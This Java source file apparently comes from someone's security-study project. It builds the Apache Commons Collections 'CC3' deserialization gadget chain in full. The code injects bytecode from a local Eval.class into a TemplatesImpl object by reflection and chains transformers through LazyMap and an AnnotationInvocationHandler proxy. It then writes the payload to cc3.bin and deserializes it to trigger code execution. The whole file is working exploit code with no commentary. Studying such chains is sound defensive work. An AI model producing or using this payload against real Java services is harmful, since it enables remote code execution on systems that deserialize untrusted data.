package com.Fc0;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CC3 {
    public static void serialize(Object obj) throws IOException {
        FileOutputStream fos = new FileOutputStream("cc3.bin");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(obj);
    }
    public static void deserialize(String filename) throws IOException, ClassNotFoundException {
        FileInputStream fis = new FileInputStream(filename);
        ObjectInputStream ois = new ObjectInputStream(fis);
        ois.readObject();
    }

    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException {
        TemplatesImpl templates = new TemplatesImpl();
        Field _name = TemplatesImpl.class.getDeclaredField("_name");
        _name.setAccessible(true);
        _name.set(templates, "1");
        Field _bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");
        _bytecodes.setAccessible(true);
        byte[] bytes = Files.readAllBytes(Paths.get("D:\\JavaSec\\CC1\\src\\main\\java\\com\\Fc0\\Eval.class"));
        byte[][] code = {bytes};
        _bytecodes.set(templates, code);
        Field _tfactory = TemplatesImpl.class.getDeclaredField("_tfactory");
        _tfactory.setAccessible(true);
        _tfactory.set(templates, new TransformerFactoryImpl());
        Field ABSTRACT_TRANSLET = TemplatesImpl.class.getDeclaredField("ABSTRACT_TRANSLET");
        ABSTRACT_TRANSLET.setAccessible(true);
        ABSTRACT_TRANSLET.set(templates, "java.lang.Object");
//        Transformer transformer = templates.newTransformer();
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> map = new HashMap<>();
        Map<Object, Object> decorate = LazyMap.decorate(map,  chainedTransformer);
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, decorate);
        Map newMap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, handler);
        Object o = constructor.newInstance(Target.class, newMap);
        serialize(o);
        deserialize("cc3.bin");
    }
}
